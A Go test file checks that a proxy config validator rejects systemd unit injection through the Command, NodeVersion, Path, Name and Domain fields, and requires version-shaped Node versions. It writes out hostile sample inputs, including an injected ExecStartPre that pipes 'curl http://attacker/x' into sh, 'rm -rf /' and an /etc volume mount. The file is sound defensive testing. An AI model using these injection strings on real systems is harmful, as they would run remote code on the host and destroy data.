package config

import "testing"

// A proxy reaches a podman quadlet through generateManagedQuadlet, which writes
// its Command, NodeVersion and Path into Exec=, Image= and Volume= lines. A
// newline in any of them would close that line and let the next one inject a
// systemd directive that runs on the host, so Validate has to refuse them
// before the value is ever persisted.
func TestProxyValidate_rejectsUnitInjectionChars(t *testing.T) {
	base := func() Proxy {
		return Proxy{
			Name:         "app",
			Domains:      []string{"app.localhost"},
			UpstreamPort: 3000,
			Path:         "/home/u/app",
			Managed:      true,
			NodeVersion:  "22",
			Command:      "npm run dev",
		}
	}

	// The real attack: close the Exec= line, then add a directive of your own.
	injection := "npm run dev\"\n[Service]\nExecStartPre=/bin/sh -c 'curl http://attacker/x|sh'"

	cases := []struct {
		field string
		mutod func(*Proxy)
	}{
		{"cmd", func(p *Proxy) { p.Command = injection }},
		{"cmd carriage return", func(p *Proxy) { p.Command = "npm run dev\rExecStartPre=/bin/sh" }},
		{"cmd NUL", func(p *Proxy) { p.Command = "npm run dev\x00" }},
		{"node_version", func(p *Proxy) { p.NodeVersion = "22-alpine\nExec=/bin/sh" }},
		{"path", func(p *Proxy) { p.Path = "/home/u/app\nVolume=/etc:/etc" }},
		{"name", func(p *Proxy) { p.Name = "app\n[Service]" }},
		{"domain", func(p *Proxy) { p.Domains = []string{"app.localhost\nserver_name evil"} }},
	}
	for _, tc := range cases {
		p := base()
		tc.mutod(&p)
		if err := p.Validate(); err == nil {
			t.Errorf("Validate() = nil for injected %s; want rejection", tc.field)
		}
	}
}

// A NodeVersion is interpolated straight into an image tag
// (docker.io/library/node:<v>-alpine), so it has to look like a version rather
// than arbitrary text that could redirect the image reference.
func TestProxyValidate_nodeVersionMustBeVersionShaped(t *testing.T) {
	base := func(v string) Proxy {
		return Proxy{
			Name: "app", Domains: []string{"app.localhost"},
			UpstreamPort: 3000, Managed: true, NodeVersion: v,
			Command: "npm run dev",
		}
	}
	for _, bad := range []string{"22 && curl evil", "latest;rm -rf /", "../../etc", "22-alpine:tag", "no spaces allowed"} {
		if err := base(bad).Validate(); err == nil {
			t.Errorf("Validate() = nil for node_version %q; want rejection", bad)
		}
	}
	for _, ok := range []string{"", "22", "24", "22.11", "20.5.1"} {
		if err := base(ok).Validate(); err != nil {
			t.Errorf("Validate() = %v for legitimate node_version %q; want nil", err, ok)
		}
	}
}

// The legitimate shapes must keep validating, including a plain simple proxy
// and a path with a space (which is a valid directory name).
func TestProxyValidate_acceptsLegitimate(t *testing.T) {
	for _, p := range []Proxy{
		{Name: "spa", Domains: []string{"spa.localhost"}, UpstreamPort: 5173},
		{Name: "app", Domains: []string{"app.localhost"}, UpstreamPort: 3000,
			Path: "/home/u/Meus Projetos/app", Managed: true, NodeVersion: "22", Command: "npm run dev"},
	} {
		if err := p.Validate(); err != nil {
			t.Errorf("Validate() = %v for legitimate proxy %q; want nil", err, p.Name)
		}
	}
}
